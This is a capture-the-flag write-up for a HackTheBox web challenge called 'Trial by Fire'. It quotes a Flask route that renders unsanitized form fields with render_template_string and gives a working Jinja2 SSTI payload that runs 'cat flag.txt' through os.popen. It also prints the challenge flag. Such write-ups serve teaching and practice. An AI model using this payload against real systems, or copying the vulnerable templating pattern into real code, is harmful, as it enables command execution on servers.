# Trial by Fire

{% hint style="info" %}
Category: Web

Difficulty: Very Easy
{% endhint %}

## Description

> As you ascend the treacherous slopes of the Flame Peaks, the scorching heat and shifting volcanic terrain test your endurance with every step. Rivers of molten lava carve fiery paths through the mountains, illuminating the night with an eerie crimson glow. The air is thick with ash, and the distant rumble of the earth warns of the danger that lies ahead. At the heart of this infernal landscape, a colossal Fire Drake awaits—a guardian of flame and fury, determined to judge those who dare trespass. With eyes like embers and scales hardened by centuries of heat, the Fire Drake does not attack blindly. Instead, it weaves illusions of fear, manifesting your deepest doubts and past failures. To reach the Emberstone, the legendary artifact hidden beyond its lair, you must prove your resilience, defying both the drake’s scorching onslaught and the mental trials it conjures. Stand firm, outwit its trickery, and strike with precision—only those with unyielding courage and strategic mastery will endure the Trial by Fire and claim their place among the legends of Eldoria.

## Required Knowledge

* Server Side Template Injection (SSTI)
* Docker Container

## Solve Walkthrough

The flag file location is not changed to root directory or somewhere else, it inside the app challenge directory. Basically, this logic behind the app is to play a game. The objective of the game is to **defeat a dragon** that have health **1337**. But, we can't defeat the dragon in a regular way, we've to find a vulnerability to defeat the dragon or at least to get the flag (not matter we win or not). So, I played this game a little bit after that I realize something that can be a vulnerability. Take a look at the image below.

<figure><img src="../.gitbook/assets/image (60).png" alt=""><figcaption></figcaption></figure>

Why it can be a vulnerability? As simple as I can manipulate the win/lose condition at there. See the route or logic behind the `/battle-report` url below.

{% code title="routes.py" lineNumbers="true" %}
```python
@web.route('/battle-report', methods=['POST'])
def battle_report():
    warrior_name = session.get("warrior_name", "Unknown Warrior")
    battle_duration = request.form.get('battle_duration', "0")

    stats = {
        'damage_dealt': request.form.get('damage_dealt', "0"),
        'damage_taken': request.form.get('damage_taken', "0"),
        'spells_cast': request.form.get('spells_cast', "0"),
        'turns_survived': request.form.get('turns_survived', "0"),
        'outcome': request.form.get('outcome', 'defeat')
    }

    REPORT_TEMPLATE = f"""
    <html>SSTI 
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Battle Report - The Flame Peaks</title>
        <link rel="icon" type="image/png" href="/static/images/favicon.png" />
        <link href="https://unpkg.com/nes.css@latest/css/nes.min.css" rel="stylesheet" />
        <link rel="stylesheet" href="/static/css/style.css">
    </head>
    <body>
        <div class="nes-container with-title is-dark battle-report">
            <p class="title">Battle Report</p>

            <div class="warrior-info">
                <i class="nes-icon is-large heart"></i>
                <p class="nes-text is-primary warrior-name">{warrior_name}</p>
            </div>

            <div class="report-stats">
                <div class="nes-container is-dark with-title stat-group">
                    <p class="title">Battle Statistics</p>
                    <p>🗡️ Damage Dealt: <span class="nes-text is-success">{stats['damage_dealt']}</span></p>
                    <p>💔 Damage Taken: <span class="nes-text is-error">{stats['damage_taken']}</span></p>
                    <p>✨ Spells Cast: <span class="nes-text is-warning">{stats['spells_cast']}</span></p>
                    <p>⏱️ Turns Survived: <span class="nes-text is-primary">{stats['turns_survived']}</span></p>
                    <p>⚔️ Battle Duration: <span class="nes-text is-secondary">{float(battle_duration):.1f} seconds</span></p>
                </div>

                <div class="nes-container is-dark battle-outcome {stats['outcome']}">
                    <h2 class="nes-text is-primary">
                        {"🏆 Glorious Victory!" if stats['outcome'] == "victory" else "💀 Valiant Defeat"}
                    </h2>
                    <p class="nes-text">{random.choice(DRAGON_TAUNTS)}</p>
                </div>
            </div>

            <div class="report-actions nes-container is-dark">
                <a href="/flamedrake" class="nes-btn is-primary">⚔️ Challenge Again</a>
                <a href="/" class="nes-btn is-error">🏰 Return to Entrance</a>
            </div>
        </div>
    </body>
    </html>
    """

    return render_template_string(REPORT_TEMPLATE)
```
{% endcode %}

Notice that **only POST request is accepted**, so be careful when you intercept the request. The `stats` array contains **un-sanitized user input** and the function is return a `render_template_string` that can cause a SSTI vulnerability. But, how we can manipulate the POST request ? **Play a little bit and when you lose, you can intercept using burp suite**.

Here's the POC when I read the flag. Basically, this payload is to import the `os` and use `popen`  to cat the `flag.txt` .

```python
damage_dealt={{config.__class__.__init__.__globals__['os'].popen('cat+flag.txt').read()}}&damage_taken=100&spells_cast=2&turns_survived=3&outcome=defeat&battle_duration=18.116
```

<figure><img src="../.gitbook/assets/image (61).png" alt=""><figcaption></figcaption></figure>

Okay, now let's manipulate the POST request to `/battle-report`  in the remote target. Here's the POC:

<figure><img src="../.gitbook/assets/image (52).png" alt=""><figcaption></figcaption></figure>

Actually, you can see the SSTI vulnerability directly in the given source code, specifically in the `/challenges/application/templates/index.html` . As the result, in the index page, it will show `49` that represent of `7*7` .&#x20;

{% code title="index.html" lineNumbers="true" %}
```html
<body>
  <div class="home-container nes-container is-rounded">
    <h1 class="nes-text is-error">Welcome to the Flame Peaks</h1>
    <p class="nes-text">
      In a land of burning rivers and searing heat, the Fire Drake stands guard over the Emberstone. Many have sought its power; none have prevailed.
      <br><br>
      Legends speak of ancient template scrolls—arcane writings that twist fate when exploited. Hidden symbols may change everything.
      <br><br>
      Can you read the runes? Perhaps {{ 7 * 7 }} is the key. <!-- SSTI -->
    </p>
    
    <form action="/begin" method="POST" class="warrior-form nes-container is-rounded">
      <div class="form-group">
        <label for="warrior_name" class="nes-text is-error">What is your name, brave warrior?</label>
        <input type="text" id="warrior_name" name="warrior_name" class="nes-input" required placeholder="Enter your name..." maxlength="30" style="background-color: rgba(17, 24, 39, 0.95);">
      </div>
      <button type="submit" class="nes-btn is-error challenge-button">
        ⚔️ Challenge the Fire Drake
      </button>
    </form>
  </div>
</body>
```
{% endcode %}

You can notice in the opening of the website.

<figure><img src="../.gitbook/assets/image (59).png" alt=""><figcaption></figcaption></figure>

## Flag

<kbd>HTB{Fl4m3\_P34ks\_Tr14l\_Burn5\_Br1ght\_cce96f85ad54b396cdee745fbe91bf5b}</kbd>
